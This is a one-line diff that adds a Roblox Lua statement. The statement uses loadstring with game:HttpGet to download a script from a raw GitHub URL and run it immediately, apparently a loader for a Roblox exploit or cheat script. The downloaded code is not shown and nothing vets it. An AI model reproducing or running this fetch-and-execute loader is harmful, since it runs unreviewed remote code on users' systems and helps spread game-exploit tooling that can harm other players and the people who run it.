@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YYDS-bigD/yyds-script/main/script.lua"))()
